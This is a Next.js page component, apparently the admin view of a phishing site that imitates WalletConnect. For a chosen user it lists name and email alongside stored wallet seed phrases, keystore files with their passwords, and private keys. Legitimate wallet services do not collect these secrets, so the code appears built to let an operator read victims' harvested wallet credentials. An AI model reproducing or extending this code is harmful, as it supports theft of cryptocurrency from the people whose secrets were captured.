import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { auth } from "@/lib/auth";
import WalletConnect from "@/models/walletConnect";
import { headers } from "next/headers";
import { notFound } from 'next/navigation';

type Props = { params: Promise<{ userId: string }> }

async function User({ params }: Props) {
  try {
    const userId = (await params).userId;

    const [wallet, userInfo] = await Promise.all([
      WalletConnect.findOne({
        userId: userId
      }),
      auth.api.getUser({
        query: { id: userId },
        headers: await headers()
      })
    ]);

    if (!wallet || !userInfo) {
      notFound();
    }

    const user = {
      fullName: userInfo.name.split(" ")[0],
      lastName: userInfo.name.split(" ")[1],
      email: userInfo.email,
      phrases: wallet.phrases,
      keystorejson: JSON.parse(JSON.stringify(wallet.keystorejson)) as { address: string, password: string }[],
      privatekey: wallet.privatekey
    };

    return (
      <section className="max-w-5xl mx-auto">
        <div className="space-y-8">
          <h2 className="text-xl font-semibold mb-2">User Details</h2>
          <div className="overflow-x-auto">
            <Table className="min-w-[600px]">
              <TableHeader>
                <TableRow>
                  <TableHead>First Name</TableHead>
                  <TableHead>Last Name</TableHead>
                  <TableHead>Email</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                <TableRow>
                  <TableCell>{user.fullName}</TableCell>
                  <TableCell>{user.lastName}</TableCell>
                  <TableCell>{user.email}</TableCell>
                </TableRow>
              </TableBody>
            </Table>
          </div>

          <div>
            <h2 className="text-xl font-semibold mb-2">Phrases</h2>
            <div className="overflow-x-auto">
              {user.phrases && user.phrases.length > 0 ? (
                <ul className="flex flex-col gap-4 min-w-[400px] pl-3">
                  {user.phrases.map((phrase, idx) => (
                    <li key={idx} className="whitespace-nowrap">{phrase}</li>
                  ))}
                </ul>
              ) : (
                <div className="text-gray-500">No data found</div>
              )}
            </div>
          </div>

          <div>
            <h2 className="text-xl font-semibold mb-2">Keystore JSON</h2>
            <div className="overflow-x-auto">
              {user.keystorejson && user.keystorejson.length > 0 ? (
                <Table className="min-w-[400px]">
                  <TableHeader>
                    <TableRow>
                      <TableHead>Keystore JSON</TableHead>
                      <TableHead>Password</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {user.keystorejson.map(({ address, password }, index) => {
                      return (
                        <TableRow key={index}>
                          <TableCell>
                            <pre className="whitespace-pre-wrap break-all">{address}</pre>
                          </TableCell>
                          <TableCell>
                            <span className="font-mono">{password}</span>
                          </TableCell>
                        </TableRow>
                      )
                    })}
                  </TableBody>
                </Table>
              ) : (
                <div className="text-gray-500 text-center">No data found</div>
              )}
            </div>
          </div>

          <div>
            <h2 className="text-xl font-semibold mb-2">Private Key</h2>
            <div className="overflow-x-auto">
              {user.privatekey && user.privatekey?.length > 0 ? (
                <div className="flex flex-col gap-4 min-w-[400px] pl-3">
                  {user.privatekey.map((key, idx) => (
                    <div key={idx} className="whitespace-nowrap">
                      {key}
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-gray-500 text-center">No data found</div>
              )}
            </div>
          </div>
        </div>
      </section>
    )
  } catch (error) {
    console.log(error);
    return (
      <div className="max-w-5xl mx-auto text-center text-red-700 py-6">
        An error occurred while fetching user data.
      </div>
    );
  }
}

export default User;